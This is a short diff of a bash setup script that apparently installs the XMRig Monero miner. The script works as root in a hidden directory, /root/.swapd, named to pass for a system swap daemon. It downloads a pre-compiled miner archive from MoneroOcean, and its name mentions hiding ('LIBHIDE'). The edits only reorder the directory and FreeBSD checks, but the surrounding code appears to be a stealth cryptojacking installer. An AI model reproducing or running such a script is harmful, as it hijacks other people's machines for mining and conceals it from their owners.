@@ -2,8 +2,8 @@
 # Debug mode disabled for cleaner output
 
 # ==================== VERSION TRACKING ====================
-readonly SCRIPT_VERSION="4.3"
-readonly BUILD_DATE="2026-03-22 05:31:06 UTC"
+readonly SCRIPT_VERSION="4.4"
+readonly BUILD_DATE="2026-03-22 05:56:00 UTC"
 readonly SCRIPT_NAME="setup_FULL_ULTIMATE_v3_2_NO_LIBHIDE"
 
 echo "=========================================="
@@ -2518,9 +2518,8 @@ else
     echo "[*] Downloading XMRig from MoneroOcean..."
 fi
 
-# Only run download section if NOT FreeBSD
-if [ "$IS_FREEBSD" != true ]; then
-
+# ==================== ENSURE WE'RE IN THE MINER DIRECTORY ====================
+# Both FreeBSD and Linux need to be in /root/.swapd for config creation
 mkdir -p /root/.swapd
 cd /root/.swapd || {
     echo "[!] Failed to cd to /root/.swapd, trying to create it..."
@@ -2530,6 +2529,9 @@ cd /root/.swapd || {
         cd /tmp || true
     }
 }
+
+# Only run download section if NOT FreeBSD
+if [ "$IS_FREEBSD" != true ]; then
 
 # Use MoneroOcean's pre-compiled XMRig (already optimized for MoneroOcean pool)
 XMRIG_URL="https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz"
